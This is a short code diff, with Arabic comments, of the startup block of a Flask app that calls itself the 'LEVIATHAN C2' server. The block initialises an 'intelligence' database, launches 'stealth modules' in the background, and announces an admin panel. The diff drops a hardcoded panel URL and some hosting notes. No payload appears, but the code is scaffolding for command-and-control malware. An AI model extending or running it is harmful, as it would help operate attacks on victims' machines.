@@ -1,19 +1,15 @@
 if __name__ == '__main__':
-    # 1. إعداد السجلات وقاعدة البيانات أولاً (تأكد أن الدوال معرفة فوق)
+    # أ. تشغيل قاعدة البيانات (Intel DB)
     setup_intelligence_db() 
-    
-    # 2. تشغيل الوحدات الثلاث 
-    # ملاحظة: سيحاول السيرفر تجميعهم، إذا كنت في Replit سيظهر لك نجاح أو خطأ حسب المترجمات المتاحة
+
+    # ب. تشغيل الوحدات الثلاث في الخلفية
     print("[!] INITIALIZING LEVIATHAN HYBRID MODULES...")
     try:
         launch_stealth_modules()
     except Exception as e:
-        print(f"[-] Initial Module Boot Failed: {e}")
+        print(f"[-] Module Deployment Error: {e}")
 
-    # 3. تشغيل السيرفر الرئيسي
-    # ملاحظة: في Replit يفضل استخدام المنفذ 8080 كما فعلت ليظهر الـ Webview
-    print(f"[*] LEVIATHAN C2 ONLINE - ADMIN:")
-    print(f"http://0.0.0.0:8080/control_panel_leviathan_99")
-    
-    # ابقِ debug=False في الإنتاج لتجنب إعادة تشغيل الوحدات مرتين
+    # ج. تشغيل السيرفر الرئيسي (Flask)
+    print(f"[*] LEVIATHAN C2 ONLINE - ADMIN PANEL READY")
+    # ملاحظة: debug=False مهم جداً لكي لا يشتغل الكود مرتين ويسبب أخطاء
     app.run(host='0.0.0.0', port=8080, debug=False)
